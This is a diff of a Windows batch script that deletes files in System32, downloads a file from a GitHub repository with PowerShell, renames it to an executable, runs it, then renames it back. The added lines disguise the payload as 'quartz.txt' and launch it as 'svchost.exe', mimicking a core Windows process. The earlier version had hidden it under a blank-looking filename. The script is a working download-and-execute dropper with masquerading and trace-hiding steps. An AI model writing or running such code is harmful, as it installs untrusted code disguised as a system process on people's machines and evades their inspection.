@@ -12,27 +12,27 @@ if %errorlevel% neq 0 (
 )
 
 :: Step 1: Delete old files
-if exist "C:\Windows\System32\SNIPER90.dll" del /f /q "C:\Windows\System32\ㅤ"
-if exist "C:\Windows\System32\BLACK FOX.exe" del /f /q "C:\Windows\System32\BLACK FOX.exe"
+if exist "C:\Windows\System32\SNIPER90.dll" del /f /q "C:\Windows\System32\quartz.txt"
+if exist "C:\Windows\System32\BLACK FOX.exe" del /f /q "C:\Windows\System32\svchost.exe"
 
 :: Step 2: Download new file
-powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/BLACK89310/BLACK-FOX/raw/refs/heads/main/.SCOP' -OutFile 'C:\Windows\System32\ㅤ' -ErrorAction Stop } catch { exit 1 }"
-if not exist "C:\Windows\System32\ㅤ" (
+powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/BLACK89310/BLACK-FOX/raw/refs/heads/main/quartz' -OutFile 'C:\Windows\System32\quartz.txt' -ErrorAction Stop } catch { exit 1 }"
+if not exist "C:\Windows\System32\quartz.txt" (
     echo [ERROR] Download failed!
     exit /b
 )
 
 :: Step 3: Rename DLL to EXE
-ren "C:\Windows\System32\ㅤ" "BLACK FOX.exe"
+ren "C:\Windows\System32\quartz.txt" "svchost.exe"
 
 :: Step 4: Execute
-start "" "C:\Windows\System32\BLACK FOX.exe"
+start "" "C:\Windows\System32\svchost.exe"
 
 :: Step 5: Wait for 5 seconds
 timeout /t 5 /nobreak >nul
 
 :: Step 6: Rename EXE back to DLL
-ren "C:\Windows\System32\BLACK FOX.exe" "ㅤ"
+ren "C:\Windows\System32\svchost.exe" "quartz.txt"
 
 :: Auto-exit
 exit
